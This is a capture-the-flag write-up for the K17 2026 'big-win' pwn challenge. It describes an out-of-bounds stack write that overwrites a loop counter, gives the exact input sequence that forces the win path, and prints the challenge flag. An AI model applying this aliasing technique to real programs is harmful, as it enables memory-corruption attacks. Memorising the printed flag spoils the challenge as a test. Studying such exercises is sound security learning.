# K17 2026 - big-win (pwn, easy)

## Challenge
- **Description:** "i heard that 99% of gamblers walk away before winning big. i am the 99%."
- **Connection:** `nc chal.secso.cc 4001`
- **Files:** `bigchal.c`
- **Flag:** `K17{maybe_the_true_reward_is_the_stacks_we_pwned_along_the_way}`

## Vulnerability
OOB array write via loop-counter skip + aliased stack locals.

The loop `while (i != SLOTS)` reads `scanf("%d", &noob.numbers[i])`. If `accum == 67`
exactly at `i == 6`, `i` increments twice (6->7->8) and the loop never exits
(`i != 7` forever) -> unlimited OOB writes. The OOB indices alias locals:

- `numbers[9]`  == `accum` (rbp-0x08)
- `numbers[10]` == `i`     (rbp-0x04)
- `numbers[-1]` == `win`   (rbp-0x30)

## Exploit
```
[0]*6 + [67]   -> accum=67 at i=6, i skips to 8
[1]            -> i=8: accum=68, i -> 9
[0]            -> i=9: accum=0 (numbers[9]=accum), i -> 10
[-2]           -> i=10: i=-2 (numbers[10]=i), accum+=numbers[-2]=0, i -> -1
[0]            -> i=-1: win=0 (numbers[-1]=win), accum=0, i -> 0
[0]*7          -> i: 0..6 -> 7, loop exits, win() prints /flag
```

Key gotchas:
- `accum += numbers[i]` re-reads `i` after scanf, so the write to `i` changes which
  slot gets accumulated (at i=10 with new i=-2, it reads numbers[-2]=0).
- Remote stack printer labels are DECIMAL offsets; decode byte order carefully.
- No canary on remote; non-PIE binary.

## Flag
```
K17{maybe_the_true_reward_is_the_stacks_we_pwned_along_the_way}
```

## Lessons
- OOB index aliasing the loop counter = loop rewind primitive (negative indices
  reach struct fields before the array).
- SNAPSHOT stack dumps: verify label base (decimal vs hex) and endianness first.
- Probe unknown stack slots through the accum side-channel.